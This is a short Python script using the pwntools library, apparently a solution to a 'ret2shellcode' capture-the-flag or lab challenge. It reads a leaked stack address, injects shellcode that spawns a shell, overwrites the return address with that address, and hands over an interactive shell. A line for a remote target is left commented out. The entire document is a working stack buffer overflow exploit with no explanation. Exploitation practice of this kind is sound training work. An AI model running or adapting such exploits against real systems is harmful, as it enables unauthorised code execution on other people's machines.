from pwn import *

context.arch = "amd64"
context.os = "linux"
io = process("./ret2shellcode")
#io = remote("xxx.xx.xxx.xxx", xxxxx)

io.recvuntil(b"Your input will be saved at ")
shellcode_addr = int(io.recvuntil(b'\n', drop=True), 16)
print("shellcode_addr = " + hex(shellcode_addr))
shellcode = asm("add rsp, 0x60;" + shellcraft.sh())
io.sendafter(b"Input: ", shellcode.ljust(0x80, b'\xaa') + p64(0xdeadbeef) + p64(shellcode_addr))

io.interactive()
